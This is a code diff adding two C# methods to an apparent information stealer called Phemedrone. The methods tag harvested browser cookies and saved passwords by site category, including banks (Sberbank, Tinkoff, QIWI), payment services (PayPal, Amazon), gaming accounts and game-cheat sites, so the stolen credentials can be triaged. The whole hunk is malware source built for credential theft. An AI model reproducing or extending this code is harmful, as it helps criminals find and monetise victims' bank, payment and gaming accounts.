@@ -114,5 +114,67 @@ namespace Phemedrone.Extensions
 
             return browserLocations;
         }
+
+        public static void CookiesTags(string url)
+        {
+            if (url.Contains("roblox.com") || url.Contains("steampowered.com") || url.Contains("genshin") || url.Contains("epicgames.com") || url.Contains("fortnite.com"))
+            {
+                ServiceCounter.cookiestags.Add("GAMES");
+            }
+
+            if (url.Contains("qiwi") || url.Contains("tinkoff") || url.Contains("yoomoney") || url.Contains("sberbank"))
+            {
+                ServiceCounter.cookiestags.Add("BANK");
+            }
+            if (url.Contains("facebook"))
+            {
+                ServiceCounter.cookiestags.Add("FACEBOOK");
+            }
+            if (url.Contains("funpay") || url.Contains("paypal") || url.Contains("americanexpress") || url.Contains("amazon"))
+            {
+                ServiceCounter.cookiestags.Add("MONEY");
+            }
+            if (url.Contains("spotify") || url.Contains("music.apple"))
+            {
+                ServiceCounter.cookiestags.Add("MUSIC");
+            }
+            
+            if (url.Contains("deadcode") || url.Contains("celka") || url.Contains("nursultan") || url.Contains("akrien") || url.Contains("expenisve") || url.Contains("wexside") || url.Contains("x.synapse") || url.Contains("synapse") || url.Contains("neverlose") || url.Contains("gamesense") || url.Contains("nixware") || url.Contains("primordial") || url.Contains("interium") || url.Contains("xone"))
+            {
+                ServiceCounter.cookiestags.Add("CHEATS");
+            }
+        }
+        public static void PasswordsTags(string url)
+        {
+            if (url.Contains("roblox.com") || url.Contains("steampowered.com") || url.Contains("genshin") || url.Contains("epicgames.com") || url.Contains("fortnite.com"))
+            {
+                ServiceCounter.passwordstags.Add("GAMES");
+            }
+
+            if (url.Contains("qiwi") || url.Contains("tinkoff") || url.Contains("yoomoney") || url.Contains("sberbank"))
+            {
+                ServiceCounter.passwordstags.Add("BANK");
+            }
+
+            if (url.Contains("facebook"))
+            {
+                ServiceCounter.passwordstags.Add("FACEBOOK");
+            }
+
+            if (url.Contains("funpay") || url.Contains("paypal") || url.Contains("americanexpress") || url.Contains("amazon"))
+            {
+                ServiceCounter.passwordstags.Add("MONEY");
+            }
+
+            if (url.Contains("spotify") || url.Contains("music.apple"))
+            {
+                ServiceCounter.passwordstags.Add("MUSIC");
+            }
+
+            if (url.Contains("deadcode") || url.Contains("celka") || url.Contains("nursultan") || url.Contains("akrien") || url.Contains("expenisve") || url.Contains("wexside") || url.Contains("x.synapse") || url.Contains("synapse") || url.Contains("neverlose") || url.Contains("gamesense") || url.Contains("nixware") || url.Contains("primordial") || url.Contains("interium") || url.Contains("xone"))
+            {
+                ServiceCounter.passwordstags.Add("CHEATS");
+            }
+        }
     }
 }
